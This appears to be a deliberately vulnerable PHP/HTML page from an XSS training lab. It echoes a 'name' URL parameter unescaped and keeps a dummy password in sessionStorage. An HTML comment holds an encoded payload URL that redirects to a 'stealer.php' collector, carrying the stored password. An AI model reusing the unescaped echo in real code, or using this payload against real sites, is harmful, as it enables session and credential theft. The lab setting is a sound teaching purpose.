<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <title>Hello dear</title>
</head>
<body>
<p>
    Salut
    <script>
        sessionStorage.setItem('session_password', "MyDefaultPasswordIsDefinitelySecure");
        sessionStorage.setItem('session_name', "Kevin Valerio");
        sessionStorage.setItem('session_sessionID', "4a2z4e3r2x8t9y7y4h9g3v2d87e4e9r3t2y8y4x");
    </script>

    <!-- http://127.0.0.1/Nine%20XSS/Session%20Management/session-two/attack/?name=%3Cscript%3Edocument.location=(%22http://127.0.0.1/Nine%20XSS/Session%20Management/session-one/attack/stealer.php?cookies=%22.concat(sessionStorage.getItem(%27session_password%27)));%3C/script%3E -->

    (peut-être t'appeles-tu) <?php if (isset($_GET["name"])) echo($_GET["name"]); ?> ?
    Va sur <a href="config.php">config.php</a> pour accéder à tes parametres
</p>

</body>
</html>